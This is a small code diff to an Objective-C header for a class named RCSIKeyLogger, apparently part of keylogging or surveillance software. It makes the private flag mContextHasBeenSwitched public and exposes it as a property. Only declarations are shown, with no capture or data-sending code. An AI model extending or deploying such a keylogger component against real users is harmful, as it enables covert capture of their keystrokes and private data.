@@ -14,10 +14,11 @@
 
 @interface RCSIKeyLogger : NSObject
 {
-@private
   NSMutableString *mBufferString;
-  //BOOL mContextHasBeenSwitched;
+  BOOL mContextHasBeenSwitched;
 }
+
+@property (readwrite) BOOL mContextHasBeenSwitched;
 
 - (id)init;
 - (void)dealloc;
